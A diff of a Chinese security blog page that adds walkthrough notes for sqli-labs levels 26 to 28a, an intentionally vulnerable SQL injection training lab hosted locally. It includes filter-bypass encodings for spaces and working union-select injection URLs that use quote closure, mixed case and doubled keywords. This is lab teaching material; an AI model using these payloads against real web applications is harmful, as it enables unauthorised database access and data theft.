@@ -417,14 +417,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        14k
+                        14.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        64 分
+                        67 分
                     </div>
                     
                 
@@ -2134,8 +2134,77 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 </ol>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25a/?id=-1 || 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2020/02/16/my3EGUOpKXgxoWh.png" alt="less25a-2.png"></p>
-<h2 id="Less26"><a href="#Less26" class="headerlink" title="Less26"></a>Less26</h2><p>基于错误_GET_过滤空格/注释_单引号_字符型注入</p>
+<h2 id="Less26"><a href="#Less26" class="headerlink" title="Less26"></a>Less26</h2><p>基于错误_GET_过滤空格/注释_单引号_字符型注入。这里将 “or”、“and”、“/*”、“#”、“–”、“/” 等特殊符号都进行了过滤了。</p>
 <hr>
+<p>绕过空格：</p>
+<pre class="line-numbers language-text"><code class="language-text">%09 TAB键（水平）
+%0a 新建一行
+%0c 新的一页
+%0d return功能
+%0b TAB键（垂直）
+%a0 空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li><p><strong>这关的SQL语句如下</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span><span class="token string">'$id'</span> <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p><strong>这里无法使用注释符，可以使用 “单引号” 来闭合SQL语句</strong></p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=1'%a0||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<p>执行的SQL语句如下：</p>
+<pre class="line-numbers language-text"><code class="language-text">SELECT * FROM users WHERE id='1' ||'1' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol start="3">
+<li><strong>联合注入</strong><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=1000'%a0union%a0select%a01,2,3%a0||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+这里 “-” 被过滤掉了，所以 id 值填 “-1” 不生效</li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=_1'%a0union%a0select%a01,2,3%a0||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>具体不知是什么原因 “&amp;&amp;” 不生效，这里可以将 “&amp;” 进行 url 编码</p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=_1'%a0union%a0select%a01,2,3%a0%26%26'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Less26a"><a href="#Less26a" class="headerlink" title="Less26a"></a>Less26a</h2><p>这关与 26 的区别在于，sql 语句添加了一个括号，同时在 sql 语句执行抛出错误后并不在前台页面输出。</p>
+<hr>
+<ol>
+<li><p><strong>这关的SQL语句如下</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'$id'</span><span class="token punctuation">)</span> <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p><strong>闭合SQL语句</strong></p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26a/?id=1')||('1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p><strong>联合注入</strong><br><a href="http://192.168.150.128/sqli-labs-master/Less-26a/?id=1000%27)union%a0select%a01,2,3||" target="_blank" rel="noopener">http://192.168.150.128/sqli-labs-master/Less-26a/?id=1000%27)union%a0select%a01,2,3||</a>(%271</p>
+</li>
+</ol>
+<h2 id="Less27"><a href="#Less27" class="headerlink" title="Less27"></a>Less27</h2><p>这关将 union，select 和 26 关过滤掉的字符。此处我们依旧和 26 关的方式是一样的，只需要将 union 和 select 改为大小写混合就可以突破。</p>
+<hr>
+<ol>
+<li><strong>联合注入</strong><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-27/?id=_1'%a0UnIon%a0SeLect%a01,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-27/?id=_1'%a0uniunionon%a0SeLect%a01,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Less27a"><a href="#Less27a" class="headerlink" title="Less27a"></a>Less27a</h2><p>本关与 27 关的区别在于对于 id 的处理，这里用的是 “双引号“ ，同时 mysql 的错误不会在前端页面显示。</p>
+<hr>
+<ol>
+<li><p><strong>这关的SQL语句如下</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span>”<span class="token variable">$id</span>“ <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p><strong>联合注入</strong></p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-27a/?id=1000"%a0UNiOn%a0SeLecT%a01,2,3||"1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<h2 id="Less28"><a href="#Less28" class="headerlink" title="Less28"></a>Less28</h2><p>本关与 27 关的区别在于对于 id 的处理，这里用的是 “’)” ，同时 mysql 的错误不会在前端页面显示。</p>
+<hr>
+<ol>
+<li><p><strong>这关的SQL语句如下</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span>（‘<span class="token variable">$id</span>’） <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p><strong>联合注入</strong></p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-28/?id=100')%a0UNiOn%a0SeLecT%a01,2,3||('1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<h2 id="Less28a"><a href="#Less28a" class="headerlink" title="Less28a"></a>Less28a</h2><p>本关与 28 基本一致，只是过滤条件少了几个。</p>
+<hr>
+<ol>
+<li><strong>联合注入</strong><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-28a/?id=100')%a0UNiOn%a0SeLecT%a01,2,3||('1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr>
 <h3 id="Less1-1"><a href="#Less1-1" class="headerlink" title="Less1"></a>Less1</h3><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p>
 <p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p>
@@ -2181,6 +2250,8 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 <p><a href="https://zhuanlan.zhihu.com/p/39917830" target="_blank" rel="noopener">SQL注入（二次注入）</a></p>
 <h3 id="Less25-1"><a href="#Less25-1" class="headerlink" title="Less25"></a>Less25</h3><p><a href="https://www.cnblogs.com/julin-peng/p/4237791.html" target="_blank" rel="noopener">URL中“#” “？” &amp;“”号的作用</a></p>
 <p><a href="https://www.jianshu.com/p/0e285c2bbfba" target="_blank" rel="noopener">sql-labs less25 or and 过滤</a></p>
+<h3 id="Less26-1"><a href="#Less26-1" class="headerlink" title="Less26"></a>Less26</h3><p><a href="https://blog.csdn.net/pcyph/article/details/45010609" target="_blank" rel="noopener">网址URL中特殊字符转义编码</a></p>
+<p><a href="https://www.cnblogs.com/lcamry/p/5762992.html" target="_blank" rel="noopener">Sqli-labs less 26</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -2243,26 +2314,24 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/02/08/Sqli-labs通关笔记/">
+                <a href="/2020/03/21/xss-labs通关笔记/">
                     <div class="card-image">
                         
-                        <img src="https://i.loli.net/2020/02/08/tAbOqHD9JfP4U87.png" class="responsive-img" alt="Sqli-labs通关笔记">
+                        <img src="https://i.loli.net/2020/03/22/uSflaqOVEc24hrA.png" class="responsive-img" alt="xss-labs通关笔记">
                         
-                        <span class="card-title">Sqli-labs通关笔记</span>
+                        <span class="card-title">xss-labs通关笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">SQL注入简介
-什么是SQL注入？SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为</div>
+                    <div class="summary">简介xss 表示 Cross Site Scripting (跨站脚本攻击)，它与 SQL 注入攻击类似，SQL 注入攻击中以 SQL 语句作为用户输入，从而达到查询/修改/删除数据的目的，而在 xss 攻击中，通过插入恶意脚本，实现对用户</div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-08
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-21
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -2275,16 +2344,15 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli-labs/" target="_blank">
-                        <span class="chip bg-color">sqli-labs</span>
+                    <a href="/tags/xss/" target="_blank">
+                        <span class="chip bg-color">xss</span>
                     </a>
                     
-                    <a href="/tags/SQL-Injection/" target="_blank">
-                        <span class="chip bg-color">SQL Injection</span>
+                    <a href="/tags/xss-labs/" target="_blank">
+                        <span class="chip bg-color">xss-labs</span>
                     </a>
                     
                 </div>
@@ -2454,7 +2522,7 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">61.7k</span>&nbsp;字
+                class="white-color">66.1k</span>&nbsp;字
                
             
 			
